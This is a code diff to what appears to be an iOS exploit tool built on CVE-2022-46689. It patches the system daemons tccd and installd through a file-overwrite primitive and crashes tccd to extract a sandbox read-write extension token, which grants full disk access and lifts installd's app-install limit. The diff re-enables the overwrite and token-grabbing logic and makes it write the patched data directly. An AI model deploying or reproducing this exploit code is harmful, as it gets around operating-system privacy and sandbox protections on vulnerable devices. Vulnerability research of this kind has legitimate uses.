@@ -1,7 +1,6 @@
-#import <Foundation/Foundation.h>
-#import <mach-o/loader.h>
-#import <mach-o/nlist.h>
-#import <sys/mman.h>
+@import Darwin;
+@import Foundation;
+@import MachO;
 
 #import <mach-o/fixup-chains.h>
 // you'll need helpers.m from Ian Beer's write_no_write and vm_unaligned_copy_switch_race.m from
@@ -297,8 +296,8 @@ static NSData* patchTCCD(void* executableMap, size_t executableLength) {
     return data;
 }
 
-static bool overwrite_file(char* to, char* from) {
-    if(funVnodeOverwrite2(to, from) == 0)
+static bool overwrite_file(char* to, NSData* data) {
+    if(funVnodeOverwriteWithData(to, data) == 0)
         return true;
     return false;
 }
@@ -325,58 +324,45 @@ static void grant_full_disk_access_impl(void (^completion)(NSString* extension_t
         return;
     }
     
-    NSURL* documentDirectory = [NSFileManager.defaultManager URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask][0];
-    NSURL* tccd_orig = [documentDirectory URLByAppendingPathComponent:@"tccd_orig.bin"];
-    NSURL* tccd_patched = [documentDirectory URLByAppendingPathComponent:@"tccd_patched.bin"];
-    
-    [[NSFileManager defaultManager] removeItemAtURL:tccd_orig error:nil];
-    [[NSFileManager defaultManager] removeItemAtURL:tccd_patched error:nil];
-    
-    [originalData writeToURL:tccd_orig atomically:true];
-    [sourceData writeToURL:tccd_patched atomically:true];
-    
-//    if (!overwrite_file(targetPath, tccd_patched.path.UTF8String)) {
-//        overwrite_file(targetPath, tccd_orig.path.UTF8String);
-//        munmap(targetMap, targetLength);
-//        completion(
-//                   nil, [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
-//                                            code:1
-//                                        userInfo:@{
-//                    NSLocalizedDescriptionKey : @"Can't overwrite file: your device may "
-//                    @"not be vulnerable to CVE-2022-46689."
-//                   }]);
-//        return;
-//    }
-//    munmap(targetMap, targetLength);
+    if (!overwrite_file(targetPath, sourceData)) {
+        overwrite_file(targetPath, originalData);
+        munmap(targetMap, targetLength);
+        completion(
+                   nil, [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
+                                            code:1
+                                        userInfo:@{
+                    NSLocalizedDescriptionKey : @"Can't overwrite file: your device may "
+                    @"not be vulnerable to CVE-2022-46689."
+                   }]);
+        return;
+    }
+    munmap(targetMap, targetLength);
     
     xpc_crasher("com.apple.tccd");
-    sleep(1);
-    //Even FREEZING when overwrite original data
-    overwrite_file(targetPath, tccd_orig.path.UTF8String);
-    xpc_crasher("com.apple.tccd");
-//    call_tccd(^(NSString* _Nullable extension_token) {
-//        overwrite_file(targetPath, tccd_orig.path.UTF8String);
-//        xpc_crasher("com.apple.tccd");
-//        NSError* returnError = nil;
-//        if (extension_token == nil) {
-//            returnError =
-//            [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
-//                                code:2
-//                            userInfo:@{
-//                NSLocalizedDescriptionKey : @"tccd did not return an extension token."
-//            }];
-//        } else if (![extension_token containsString:@"com.apple.app-sandbox.read-write"]) {
-//            returnError = [NSError
-//                           errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
-//                           code:3
-//                           userInfo:@{
-//                NSLocalizedDescriptionKey : @"tccd patch failed: returned a media library token "
-//                @"instead of an app sandbox token."
-//            }];
-//            extension_token = nil;
-//        }
-//        completion(extension_token, returnError);
-//    });
+    sleep(3);
+    call_tccd(^(NSString* _Nullable extension_token) {
+        overwrite_file(targetPath, originalData);
+        xpc_crasher("com.apple.tccd");
+        NSError* returnError = nil;
+        if (extension_token == nil) {
+            returnError =
+            [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
+                                code:2
+                            userInfo:@{
+                NSLocalizedDescriptionKey : @"tccd did not return an extension token."
+            }];
+        } else if (![extension_token containsString:@"com.apple.app-sandbox.read-write"]) {
+            returnError = [NSError
+                           errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
+                           code:3
+                           userInfo:@{
+                NSLocalizedDescriptionKey : @"tccd patch failed: returned a media library token "
+                @"instead of an app sandbox token."
+            }];
+            extension_token = nil;
+        }
+        completion(extension_token, returnError);
+    });
 }
 
 void grant_full_disk_access(void (^completion)(NSError* _Nullable)) {
@@ -431,6 +417,7 @@ void grant_full_disk_access(void (^completion)(NSError* _Nullable)) {
 }
 
 /// MARK - installd patch
+
 struct installd_remove_app_limit_offsets {
     uint64_t offset_objc_method_list_t_MIInstallableBundle;
     uint64_t offset_objc_class_rw_t_MIInstallableBundle_baseMethods;
@@ -582,7 +569,7 @@ static NSData* make_patch_installd(void* executableMap, size_t executableLength)
 }
 
 bool patch_installd() {
-    const char* targetPath = "/usr/libexec/installd";
+    char* targetPath = "/usr/libexec/installd";
     int fd = open(targetPath, O_RDONLY | O_CLOEXEC);
     off_t targetLength = lseek(fd, 0, SEEK_END);
     lseek(fd, 0, SEEK_SET);
@@ -590,24 +577,13 @@ bool patch_installd() {
     
     NSData* originalData = [NSData dataWithBytes:targetMap length:targetLength];
     NSData* sourceData = make_patch_installd(targetMap, targetLength);
-    
-    NSURL* documentDirectory = [NSFileManager.defaultManager URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask][0];
-    NSURL* installd_orig = [documentDirectory URLByAppendingPathComponent:@"installd.bin"];
-    NSURL* installd_patched = [documentDirectory URLByAppendingPathComponent:@"installd_patched.bin"];
-    
-    [[NSFileManager defaultManager] removeItemAtURL:installd_orig error:nil];
-    [[NSFileManager defaultManager] removeItemAtURL:installd_patched error:nil];
-    
-    [originalData writeToURL:installd_orig atomically:true];
-    [sourceData writeToURL:installd_patched atomically:true];
-    
     if (!sourceData) {
         NSLog(@"can't patchfind");
         return false;
     }
     
-    if (!overwrite_file(targetPath, installd_patched.path.UTF8String)) {
-        overwrite_file(targetPath, installd_orig.path.UTF8String);
+    if (!overwrite_file(targetPath, sourceData)) {
+        overwrite_file(targetPath, originalData);
         munmap(targetMap, targetLength);
         NSLog(@"can't overwrite");
         return false;
@@ -618,7 +594,6 @@ bool patch_installd() {
     
     // TODO(zhuowei): for now we revert it once installd starts
     // so the change will only last until when this installd exits
-    overwrite_file(targetPath, installd_orig.path.UTF8String);
-    
+    overwrite_file(targetPath, originalData);
     return true;
 }
